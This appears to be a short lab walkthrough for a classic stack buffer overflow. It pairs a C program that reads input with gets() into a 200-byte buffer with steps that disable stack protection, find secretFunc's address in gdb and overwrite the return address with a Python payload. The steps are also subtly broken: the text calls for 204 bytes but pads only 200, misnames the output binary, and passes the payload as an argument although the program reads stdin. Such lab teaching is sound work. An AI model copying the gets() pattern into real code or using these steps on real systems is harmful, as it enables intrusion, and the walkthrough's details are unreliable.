# Attacks
___
Firstly, run the docker image
```bash
docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab
```
## Bof1.c 
***
```c
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        printf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
Firstly, we need to compile the code.
```shell script --compile
gcc -g bof1.c -o bof1,out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
gdb -q ./bof1.out
```
In order to run the secretFunc, we need to overwrite the return address of the vuln function with the address of the secretFunc.
And to do that we need to find the address of the secretFunc.
```shell script --gdb-peda
gdb-peda$ p secretFunc
```
output:
```shell script --gdb-peda
$1 = {void ()} 0x804846b <secretFunc>
```
We know the stack frame of the vuln function

We know the array is 200 bytes long, and ebp is 4 bytes long, so we need to overwrite 204 bytes to reach the return address.
```shell script --gdb-peda
gdb-peda$ r $(python -c 'print "A"*200 + "\x6b\x84\x04\x08"')
```



